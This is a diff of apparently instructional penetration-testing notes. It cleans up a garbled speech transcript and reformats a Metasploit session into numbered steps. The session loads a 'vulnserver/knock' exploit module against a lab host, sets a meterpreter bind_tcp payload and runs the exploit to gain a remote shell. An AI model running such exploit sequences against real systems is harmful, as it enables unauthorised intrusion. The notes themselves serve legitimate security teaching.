@@ -171,39 +171,26 @@ This is the worst way of helping customers in penetration testing.
 
 ### Using metasploit
 
-is using metasploit so minus plus you
-have to run a few commands a lot of
-commands okay i'll show you
-so the third approach is using montage
-that's what you are using today
-but let's look at each option you see
-which one
-actually you want to sell to your
-customers right so basically you are
-selling your products to
-the print testers okay
-so the first option is a programming or
-two
-and uh
-
+Actuyally, we can use Metasploit to do the eexactly same thing.
+Basically, you tell your customers the sequene of Metasploit commands 
 
 Let’s assume somebody created the attack module for Metasploit
 
-msf6 > use exploit/windows/vulnserver/knock
-[\*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf6 exploit(windows/vulnserver/knock) > set RHOSTS 192.168.1.19
-RHOSTS => 192.168.1.19
-msf6 exploit(windows/vulnserver/knock) > set TARGET 0
-TARGET => 0
-msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
-LHOST => 192.168.1.4
-msf6 exploit(windows/vulnserver/knock) > set LPORT 19521
-LPORT => 19521
-msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/bind_tcp
-PAYLOAD => windows/meterpreter/bind_tcp
-msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
-RPORT => 9999
-msf6 exploit(windows/vulnserver/knock) > exploit -j
+1. msf6 > use exploit/windows/vulnserver/knock
+2. [\*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+3. msf6 exploit(windows/vulnserver/knock) > set RHOSTS 192.168.1.19
+4. RHOSTS => 192.168.1.19
+5. msf6 exploit(windows/vulnserver/knock) > set TARGET 0
+6. TARGET => 0
+7. msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
+8. LHOST => 192.168.1.4
+9. msf6 exploit(windows/vulnserver/knock) > set LPORT 19521
+10. LPORT => 19521
+11. msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/bind_tcp
+12. PAYLOAD => windows/meterpreter/bind_tcp
+13. msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
+14. RPORT => 9999
+15. msf6 exploit(windows/vulnserver/knock) > exploit -j
 
 
 
